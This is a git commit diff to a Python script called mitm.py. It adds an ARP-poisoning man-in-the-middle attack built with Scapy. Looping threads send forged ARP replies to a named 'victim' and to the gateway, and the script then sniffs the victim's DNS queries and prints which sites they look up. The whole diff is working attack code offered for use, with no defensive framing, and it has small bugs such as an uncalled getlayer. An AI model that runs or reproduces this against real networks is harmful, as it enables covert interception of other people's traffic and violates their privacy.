fe92c2af2b36bf72b59c1b915a9b1ed684d6fb84
deeghayu <deefernando6@gmail.com>
2021-07-23 09:22:47 +0530

    Update mitm.py

--- mitm.py
+++ mitm.py
@@ -16,3 +16,37 @@ os.system('service whoopsie stop')
 def dnshandle(pkt):
     if pkt.haslayer(DNS) and pkt.getlayer.qr== 0:
         print("Victim: " + VIP + "has searched for: " + pkt.getlayer(DNS).qd.qname)
+		
+def v_poison():
+    v=ARP(pdst=VIP, psrc=GW)
+    while True:
+        try:
+            send(v,verbose=0, inter=2,loop=1)
+
+        except KeyboardInterrupt:
+            sys.exit(1)
+
+
+def gw_poison():
+    gw = ARP(pdst=GW, psrc=VIP)
+    while True:
+        try:
+            send(gw,verbose=0,inter=2,loop=1)
+        except KeyboardInterrupt:
+            sys.exit(1)
+
+vthread=[]
+gwthread=[]
+
+while True:
+    vpoison = threading.Thread(target=v_poison)
+    vpoison.setDaemon(True)
+    vthread.append(vpoison)
+    vpoison.start()
+
+    gwpoison = threading.Thread(target=gw_poison)
+    gwpoison.setDaemon(True)
+    gwthread.append(gwpoison)
+    gwpoison.start()
+
+    pkt = sniff(iface=IFACE,filter='udp port 53', prn=dnshandle)
